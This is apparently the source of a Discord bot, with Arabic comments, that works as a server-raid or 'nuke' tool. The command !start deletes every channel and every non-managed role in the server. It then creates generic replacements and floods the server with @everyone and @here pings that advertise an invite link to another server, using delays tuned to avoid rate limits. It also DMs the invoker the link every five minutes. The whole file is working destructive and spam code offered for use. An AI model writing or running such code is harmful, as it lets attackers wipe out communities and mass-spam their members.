const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
    ]
});

const PREFIX = '!'; // البرفكس
const TARGET_SERVER_LINK = 'https://discord.gg/kzRnSxGKkX'; // رابط السيرفر المستهدف

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    if (message.content.startsWith(PREFIX + 'start')) {
        const guild = message.guild;
        if (!guild) return;

        message.reply('جاري تنفيذ العمليات بالتزامن وبسرعة مضاعفة...');

        // 1. نظام إرسال الرابط في الخاص كل 5 دقائق
        setInterval(async () => {
            try {
                await message.author.send(`رابط السيرفر:\n${TARGET_SERVER_LINK}`);
            } catch (err) {
                console.log('لا يمكن الإرسال للخاص.');
            }
        }, 5 * 60 * 1000);

        // 2. إرسال الرابط في الرومات العامة الموجودة مسبقاً مع @everyone و @here
        guild.channels.cache.forEach(async channel => {
            if (channel.isTextBased() && channel.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.SendMessages)) {
                try {
                    await channel.send(`@everyone @here\nرابط السيرفر الجديد والرسالة:\n${TARGET_SERVER_LINK}`);
                } catch (e) {}
            }
        });

        // 3. التنفيذ المتزامن (حذف وإنشاء الرومات والرولات معاً) وبسرعة 1.8x
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms / 1.8));

        // تنفيذ حذف وإنشاء الرومات
        const channelsTask = (async () => {
            // حذف الرومات القديمة
            for (const [id, channel] of guild.channels.cache) {
                try {
                    await channel.delete();
                    await delay(500); 
                } catch (e) {}
            }

            // إنشاء رومات جديدة وإرسال الرسالة فيها 8 مرات
            for (let i = 1; i <= 5; i++) {
                try {
                    const newChannel = await guild.channels.create({
                        name: `room-${i}`,
                        type: 0 // GuildText
                    });
                    await delay(1000);

                    // تكرار إرسال الرسالة 8 مرات في الروم المنشأ حديثاً
                    for (let j = 1; j <= 8; j++) {
                        await newChannel.send(`@everyone @here\nرسالة تعليمية (${j}/8):\n${TARGET_SERVER_LINK}`);
                        // تأخير قصير جداً بين الرسائل المتتالية لتجنب الـ Rate Limit
                        await delay(300); 
                    }
                } catch (e) {}
            }
        })();

        // تنفيذ حذف وإنشاء الرولات بالتزامن
        const rolesTask = (async () => {
            // حذف الرولات القديمة (غير الأساسية)
            for (const [id, role] of guild.roles.cache) {
                if (!role.managed && role.id !== guild.id) {
                    try {
                        await role.delete();
                        await delay(500);
                    } catch (e) {}
                }
            }

            // إنشاء رولات جديدة
            for (let i = 1; i <= 5; i++) {
                try {
                    await guild.roles.create({
                        name: `Role-${i}`,
                        color: 'Random'
                    });
                    await delay(1000);
                } catch (e) {}
            }
        })();

        // تشغيل الاثنين معاً في نفس الوقت
        await Promise.all([channelsTask, rolesTask]);
    }
});

client.login('YOUR_BOT_TOKEN'); // ضع توكن البوت هنا
